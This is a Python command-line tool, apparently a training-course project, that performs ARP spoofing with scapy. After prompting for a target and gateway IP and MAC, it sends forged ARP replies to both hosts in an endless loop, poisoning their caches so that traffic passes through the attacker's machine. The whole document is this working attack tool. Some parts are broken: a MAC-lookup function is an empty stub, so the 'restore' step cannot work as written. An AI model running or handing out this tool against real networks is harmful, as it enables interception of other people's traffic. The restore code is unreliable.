#!/usr/bin/python3
import scapy.all as scapy
import time
import sys
import pyfiglet
from prettytable import PrettyTable
import os

banner = pyfiglet.figlet_format("\nARP *\n\tSPOOFER", font="starwars")
print(banner)
text = PrettyTable()
text.field_names = ["C3"]
text.add_row(["""
          \nHello EVERY ONE !!!                
          \n WELCOME To ARP_Spoofer
          \n*******************************************    C3       **************************************

       \tpresented by : civic v chacko
       \n\tcourse       : ADCD
       \n\t\tInstitution  : RedTeam Hacker Academy 

             \n***************************************>    Version 1.0  <*********************************
     """])

print(text)


def restart():
    start = sys.executable
    os.execl(start, start, *sys.argv)



options = input("""\n C3 Menu  

          1) ALL Networks
          2) Network status
          3) ARP_Spoofer
          \n Enter your option : """)


if options == '1':
    try:

        os.system("\nnetdiscover")
    except KeyboardInterrupt:
        print('interception')
    print(restart())

elif options == '2':
    os.system("\nifconfig")
    print(restart())

elif options == '3':

    targetIP = str(input("\n\nEnter the target IP : "))

    gatewayIP = str(input("Enter the gateway IP  : "))

    destinationmac = input("Enter the target MAC : ")

    sourceMAC = input("source MAC : ")


    def spoofer(targetIP, spoofIP):

        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationmac, psrc=spoofIP)
        scapy.send(packet, verbose=False)


    def getmac(destinationIP):
        pass


    def restore(destinationIP, attackerIP):

        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=getmac(destinationIP), psrc=attackerIP, hwsrc=sourceMAC)
        scapy.send(packet, count=4, verbose=False)


    packets = 0
    try:
        while True:
            spoofer(targetIP, gatewayIP)
            spoofer(gatewayIP, targetIP)
            print("\r[+] Sent packets " + str(packets)),
            sys.stdout.flush()
            packets += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")

        restore(targetIP, gatewayIP)
        restore(gatewayIP, targetIP)
        restart()


    def spoofer(targetIP, spoofIP):
        destinationmac = getmac(targetIP)
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationmac, hwsrc=spoofIP)
        scapy.send(packet, verbose=False)


    spoofer(targetIP, gatewayIP)
    spoofer(gatewayIP, targetIP)

elif options >= '4':
    print("!!!!  Enter a valid Option")
    restart()
